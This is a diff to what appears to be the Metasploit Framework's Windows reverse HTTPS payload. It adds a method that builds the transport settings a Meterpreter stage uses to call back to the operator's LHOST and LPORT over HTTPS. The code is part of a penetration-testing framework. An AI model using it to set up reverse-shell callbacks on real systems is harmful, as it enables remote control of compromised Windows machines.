@@ -3,6 +3,7 @@
 require 'msf/core'
 require 'msf/core/payload/windows/reverse_winhttp'
 require 'msf/core/payload/windows/verify_ssl'
+require 'rex/payloads/meterpreter/uri_checksum'
 
 module Msf
 
@@ -80,6 +81,27 @@ module Payload::Windows::ReverseWinHttps
     }
 
     generate_reverse_winhttps(conf)
+  end
+
+  def generate_transport_config(opts={})
+    # most cases we'll haev a URI already, but in case we don't
+    # we should ask for a connect to happen given that this is
+    # going up as part of the stage.
+    uri = opts[:uri]
+    unless uri
+      sum = uri_checksum_lookup(:connect)
+      uri = generate_uri_uuid(sum, opts[:uuid])
+    end
+
+    {
+      :scheme       => 'https',
+      :lhost        => datastore['LHOST'],
+      :lport        => datastore['LPORT'].to_i,
+      :uri          => uri,
+      :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
+      :retry_total  => datastore['SessionRetryTotal'].to_i,
+      :retry_wait   => datastore['SessionRetryWait'].to_i
+    }
   end
 
   #
